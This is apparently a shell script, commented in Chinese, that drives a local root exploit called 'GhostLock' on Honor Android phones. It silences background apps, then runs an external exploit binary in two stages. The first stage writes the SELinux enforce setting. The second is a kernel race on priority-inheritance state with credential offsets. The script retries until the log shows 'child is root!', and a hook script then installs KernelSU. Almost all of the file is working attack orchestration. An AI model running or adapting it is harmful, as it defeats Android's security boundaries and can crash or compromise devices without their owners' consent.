#!/system/bin/sh
# GhostLock-HonorFne 全程本地版（无 adb）
# 原 run_w2.sh 的 adb shell "X" -> sh -c "X"; adb reboot -> 提示手动重启
#
# 说明：这是漏洞利用的驱动脚本。它先安静化设备（降低竞态噪声），
# 然后反复执行 W1(--write1) / W2 两段利用，直到 root 到手。
# W2 成功后漏洞进程会以 setsid 拉起 chain_hook.sh，后者负责把 root
# 权限搬进 FIFO 通道，所以本脚本只要看到日志里出现 "child is root!" 就停手。

E="/data/local/tmp/ksu_fne/e"
D="/data/local/tmp/ksu_fne"
LOG="/storage/emulated/0/root/_fne/fne_run.log"
SYNC="GL_AIM_DM=1 GL_W1_ATTEMPTS=2 GL_ROUTE_ATTEMPTS=1 GL_HOLD_CHAIN=1 GL_HOLD_WAITER=1 GL_PUNCH_IN_WINDOW=1 GL_PUNCH_DELAY_USEC=0 GL_MCAST_ROUTE=1 GL_PROBE_BOOTID=0 GL_SPRAY_TEST=0 GL_STAMP_SYNC=1"

say() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG"; }

# 抓一次 panic 现场（尽力而为）
grab_pstore() {
  for f in /sys/fs/pstore/*; do
    [ -f "$f" ] || continue
    say "PSTORE: $f"
    cat "$f" >> "$LOG" 2>/dev/null
  done
}

# 安静化设备
settle() {
  say "settle: force-stop 相册/搜索"
  am force-stop com.hihonor.photos >/dev/null 2>&1
  am force-stop com.hihonor.searchservice >/dev/null 2>&1
  am kill-all >/dev/null 2>&1
  pm trim-caches 999999999999 >/dev/null 2>&1
  say "settle: 静默 5s"
  i=5
  while [ $i -gt 0 ]; do
    say "  倒计时 $i"
    sleep 1
    i=$((i-1))
  done
}

# 检查 kernelsu 是否真正可用（不是"假 Live"）
# 三重判据：
#   1) /proc/modules 里有 kernelsu 且地址非 0
#   2) /sys/module/kernelsu/version 可读
#   3) /sys/module/kernelsu/parameters/ 目录存在
#
# 注意：KernelSU 3.3.0 加载后不再创建 /sys/module/kernelsu/ 节点，
# 因此本函数在本机上恒为 false，流程实际靠日志里的 "child is root!" 收尾。
ksu_loaded() {
  # 判据 1：模块记录存在（含地址检查）
  grep -q "^kernelsu " /proc/modules 2>/dev/null || return 1

  # 判据 2：sysfs version 节点存在且非空（这是最硬的条件）
  [ -r /sys/module/kernelsu/version ] || return 1
  V=$(cat /sys/module/kernelsu/version 2>/dev/null)
  [ -n "$V" ] || return 1

  # 判据 3：parameters 目录存在
  [ -d /sys/module/kernelsu/parameters ] || return 1

  say "KSU 校验: version=$V (真 Live)"
  return 0
}

# 仅用于诊断：报告为什么 ksu_loaded 失败
ksu_diag() {
  say "--- KSU 诊断 ---"
  say "modules: $(grep '^kernelsu ' /proc/modules 2>/dev/null || echo NONE)"
  if [ -r /sys/module/kernelsu/version ]; then
    say "sysfs version: $(cat /sys/module/kernelsu/version 2>/dev/null)"
  else
    say "sysfs version: MISSING (模块未完成初始化)"
  fi
  if [ -d /sys/module/kernelsu/parameters ]; then
    say "sysfs parameters: OK"
  else
    say "sysfs parameters: MISSING"
  fi
  say "--- 诊断结束 ---"
}

say "=== GhostLock-HonorFne 本地流程启动 ==="
say "E=$E  D=$D"
[ -f "$E" ] || { say "FATAL: $E 文件不存在"; exit 1; }
[ -x "$E" ] || say "WARN: $E 无 x 位，尝试 sh 调用"; ls -l "$E" >>"$LOG" 2>&1; id >>"$LOG" 2>&1; getenforce >>"$LOG" 2>&1
[ -f "$D/chain_hook.sh" ] || { say "FATAL: $D/chain_hook.sh 不存在"; exit 1; }

ADJ=0
TRY=1
while [ "$TRY" -le 8 ]; do
  say "----- TRY $TRY  ADJ=$ADJ -----"
  settle
  grab_pstore

  if ksu_loaded; then
    say "KernelSU 已在运行 -> 结束"
    break
  fi

  # W1: 尝试写 SELinux enforce
  say "W1 try (--write1)"
  env $SYNC "$E" --write1 >> "$LOG" 2>&1
  RC=$?
  say "W1 返回 rc=$RC"

  # 若 W1 成功，进一步跑 W2
  # 只跑 1 轮：W2 成功(root)后其 park 的 waiter 不能被二次 PI 操作打扰，
  # 否则踢到 pi_blocked_on ghost -> panic。root 到手即停。
  W2N=0
  while [ "$W2N" -lt 1 ]; do
    W2N=$((W2N+1))
    say "W2 round $W2N/1 (ADJ=$ADJ)"
    env $SYNC GL_W2_ROUNDS=1 GL_W2_CRED_ADJ=$ADJ "$E" >> "$LOG" 2>&1
    RRC=$?
    say "W2 返回 rc=$RRC"

    if grep -q "child is root!" "$LOG" 2>/dev/null; then
      say "ROOT 到手 -> 停止 W2，不再叠加 PI 操作"
      break 2
    fi

    if ksu_loaded; then
      say "KSU READY"
      break 2
    fi

    # 若 erase_ran 且 child uid 仍是 2000，则调 ADJ
    if grep -q "erase_ran=1" "$LOG" 2>/dev/null && grep -q "child uid = 2000" "$LOG" 2>/dev/null; then
      ADJ=$((ADJ+8))
      [ "$ADJ" -gt 16 ] && ADJ=16
      say "ADJ 提升到 $ADJ"
    fi
  done

  grab_pstore
  TRY=$((TRY+1))
  say "本轮结束，准备下一轮（建议手动重启以换布局）"
  say "如需继续，重启后重新执行本脚本；否则退出。"
done

say "=== 流程结束 ==="
say "若未见 KSU READY，请查看 $LOG 与 /sys/fs/pstore/"
